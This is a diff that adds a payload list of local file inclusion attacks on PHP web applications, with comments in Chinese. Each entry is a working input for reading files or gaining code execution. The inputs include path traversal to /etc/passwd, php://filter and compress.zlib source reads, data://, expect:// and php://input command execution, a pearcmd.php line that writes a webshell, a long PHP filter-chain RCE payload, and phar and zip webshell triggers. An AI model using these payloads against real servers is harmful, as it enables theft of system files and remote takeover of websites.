@@ -1,0 +1,24 @@
+# LFI - 读取 Linux 密码文件
+../../../../../../../../etc/passwd
+# LFI - PHP 封装器读取源码 (base64 绕过)
+php://filter/convert.base64-encode/resource=index.php
+# LFI - data:// 封装器直接命令执行
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs/Pg==
+# LFI - expect:// 封装器执行系统命令
+expect://cat /etc/passwd
+# LFI - php://input POST 原始数据执行代码
+# @method: POST
+# @body: <?php system('id');?>
+php://input
+# LFI - phar:// 反序列化 RCE (先上传 phar 文件任意后缀, 再触发 metadata 反序列化)
+phar://./uploads/evil.gif
+# LFI - Pearcmd.php RCE (register_argc_argv=On)
+/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1])?>+/tmp/shell.php
+# LFI - PHP filter chain 生成 RCE payload (php_filter_chain_generator)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBMWin.ISOIR111|convert.iconv.IBMCP273.IBMCP1124|convert.iconv.IBMCP870.ISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode/resource=php://temp
+# LFI - compress.zlib:// 封装器读取流量
+compress.zlib://file:///etc/passwd
+# LFI - zip:// 封装器解压包含 (需先上传含 webshell 的 zip 文件)
+zip://./uploads/evil.zip%23shell.php
+# LFI - Windows ADS (Alternate Data Stream) 读取隐藏数据
+c:\inetpub\wwwroot\index.php::$DATA
